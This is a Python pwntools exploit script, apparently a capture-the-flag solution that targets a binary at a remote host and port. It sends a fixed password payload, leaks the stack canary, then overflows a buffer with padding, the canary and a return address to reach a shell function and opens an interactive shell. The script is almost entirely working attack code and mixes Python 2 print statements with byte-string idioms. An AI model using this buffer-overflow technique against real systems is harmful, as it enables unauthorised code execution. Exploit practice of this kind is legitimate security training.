#coding=utf-8
from pwn import *

context(arch="amd64", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = 'chuj.top'
port = '50610'
reomote_addr = [ip,port]
binary = './a.out'

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7e')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base


shell = 0x000000000401256

def exp2():
	ru('enter your pass word\n')
	payload = '\x47\xF1\x94\x82\x0E\x1E\x36\xB0\xA9\xA6\xD8\x4E\xC3\xE0\x09\x8C'
	sd(payload)
	rv(0x18)
	canary = u64(rv(8))
	print "canary=>",hex(canary)
	payload = 'a'*0x18 + p64(canary) + 'junkjunk' + p64(shell)
	sl(payload)


# attach(p,'b main')
exp2()





it()